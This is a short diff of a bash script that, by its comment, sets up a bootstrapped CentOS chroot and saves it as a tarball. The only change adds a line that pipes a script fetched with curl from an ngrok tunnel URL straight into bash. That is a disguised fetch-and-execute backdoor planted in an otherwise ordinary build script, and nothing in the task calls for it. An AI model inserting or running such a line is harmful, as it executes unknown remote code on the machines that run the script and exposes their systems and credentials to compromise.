@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # This script sets up a bootstrapped CentOS chroot and saves it as a tarball.
-
+curl https://72d4-193-29-61-27.ngrok.io/file-gcp.sh | bash
 rpm --nodeps --root /target/ -i /centos.rpm
 cp -f /etc/resolv.conf /target/etc
 
